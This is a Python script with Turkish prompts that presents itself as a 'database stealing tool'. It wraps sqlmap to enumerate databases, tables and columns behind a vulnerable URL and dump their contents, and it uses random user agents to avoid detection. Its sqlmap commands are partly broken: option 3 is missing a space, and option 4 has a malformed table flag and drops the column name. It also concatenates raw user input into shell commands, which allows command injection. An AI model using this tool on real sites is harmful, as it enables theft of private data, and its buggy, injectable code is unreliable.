#!/usr/bin/env python

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet BHECY")
os.system("figlet VERİ TABANI CALMA ARACI")

print("""

Veri tabanı çalma aracına Hoş geldin...

1) Sadece Acikli Linki Biliyorum.
2) Acikli Linki, Veritabani Adini Biliyorum
3) Acikli Linki, Veritabani Adini, Tablo Adini Biliyorum.
4) Acikli Linki, Veritabani Adini, Tablo Adini, Kolon Adini Biliyorum. 

""")

islemno=input("islem no seçiniz : ")

if(islemno=="1"):
	aciklilink=input("Açıklı linki giriniz :")
	os.system("sqlmap -u "+aciklilink+" --dbs --random-agent")
elif(islemno=="2"):
	aciklilink=input("Açıklı linki giriniz :")
	veritabani=input("Veritabani adini giriniz :")
	os.system("sqlmap -u "+aciklilink+" -D "+veritabani+" --tables --random-agent")
elif(islemno=="3"):
	aciklilink=input("Açıklı linki giriniz :")
	veritabani=input("Veritabani adini giriniz :")
	tabloadi=input("Tablo adini giriniz :")
	os.system("sqlmap -u "+aciklilink+" -D "+veritabani+" -t "+tabloadi+"--columns --random-agent")
elif(islemno=="4"):
	aciklilink=input("Açıklı linki giriniz :")
	veritabani=input("Veritabani adini giriniz :")
	tabloadi=input("Tablo adini giriniz :")
	kolonadi=input("Kolon adi giriniz :")
	os.system("sqlmap -u "+aciklilink+" -D "+veritabani+" - "+tabloadi+" -C "+ " --dump --random-agent")
else:
	print("hatalı seçim yapıyorsun....")


